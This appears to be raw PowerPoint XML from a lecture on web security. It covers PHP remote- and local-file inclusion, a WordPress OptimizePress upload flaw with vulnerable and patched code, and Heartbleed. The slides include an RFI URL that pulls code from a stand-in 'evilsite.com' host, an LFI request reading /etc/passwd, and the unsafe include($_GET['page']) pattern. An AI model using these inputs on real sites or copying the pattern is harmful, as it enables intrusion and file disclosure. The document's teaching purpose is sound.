            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include($_GET[‘page’].”.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include(“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>footer.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?&gt;</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5620484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Malicious Use (Remote-File Inclusion)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>victim.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>index.php?page</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>evilsite.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>evilcode</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include(“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>header.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include($_GET[‘page’].”.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include(“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>footer.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?&gt;</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41855018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Malicious Use (Local-File Inclusion)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>victim.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>index.php?page</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/passwd%00</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include(“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>header.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include($_GET[‘page’].”.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	include(“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>footer.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26144581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Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="minesweeper.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8770" y="1417638"/>
            <a:ext cx="6426200" cy="4711700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8420048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Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Complexity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Protocols</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Browsers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scripts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Servers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scripts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17779555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Each file on the web server (under the web directory) can be invoked directly from the network by giving its name as part of the URL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-&gt; Each file represents an unintended entry point</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22666294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err="1"/>
              <a:t>WordPress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>OptimizePress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t> Theme – File Upload Vulnerability</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The beginning of the vulnerable files:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>		</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t> include "../../../../../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>wp-config.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>"; ?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>		&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>get_template_directory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>(); ?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The beginning of the patched files:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>		</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t> include "../../../../../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>wp-config.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>			if ( !</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>current_user_can</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>add_users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>') ) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>				echo 'You cannot access this file. Sorry.';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>				exit;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>			}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>		?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>		&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0" err="1"/>
              <a:t>get_template_directory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2900" dirty="0"/>
              <a:t>(); ?&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23989730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p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1677491" y="1490729"/>
            <a:ext cx="5755610" cy="4630650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29441395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p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(Fresh) Vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://blog.sucuri.net/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The Open Web Application Security Project</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>www.owasp.org</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>index.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>About_OWASP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="130476206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Heartbleed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Security bug discovered in the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>OpenSSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> library</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Yes. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>OpenSSL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Used everywhere (the implementation of TLS protocol)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>“At the time of disclosure, some 17% (around half a million) of the Internet's secure web servers certified by trusted authorities were believed to be vulnerable to the attack, allowing theft of the servers' private keys and users' session cookies and passwords” (Wiki)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="heartble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0443" y="444873"/>
            <a:ext cx="1606357" cy="1945529"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13933154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Heartbleed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1380486" y="2333170"/>
            <a:ext cx="1352877" cy="211227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Client</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6323176" y="2333170"/>
            <a:ext cx="1352877" cy="211227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Server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>OpenSSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="7" name="Straight Arrow Connector 6"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2733363" y="3202931"/>
            <a:ext cx="3589813"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H="1" flipV="1">
            <a:off x="2733363" y="3699938"/>
            <a:ext cx="3589813"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78826" y="2771532"/>
            <a:ext cx="1962572" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>HeartbeatMessage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3631226" y="3759123"/>
            <a:ext cx="1387068" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SSL3_Record</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35848289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0486" y="2333170"/>
            <a:ext cx="1352877" cy="211227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Client</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6323176" y="2333170"/>
            <a:ext cx="1352877" cy="211227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Server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>OpenSSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="7" name="Straight Arrow Connector 6"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2733363" y="3202931"/>
            <a:ext cx="3589813"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H="1" flipV="1">
            <a:off x="2733363" y="3699938"/>
            <a:ext cx="3589813"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78826" y="2771532"/>
            <a:ext cx="1962572" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>HeartbeatMessage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3631226" y="3759123"/>
            <a:ext cx="1387068" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SSL3_Record</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1380486" y="123242"/>
            <a:ext cx="7206142" cy="2031325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>struct</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
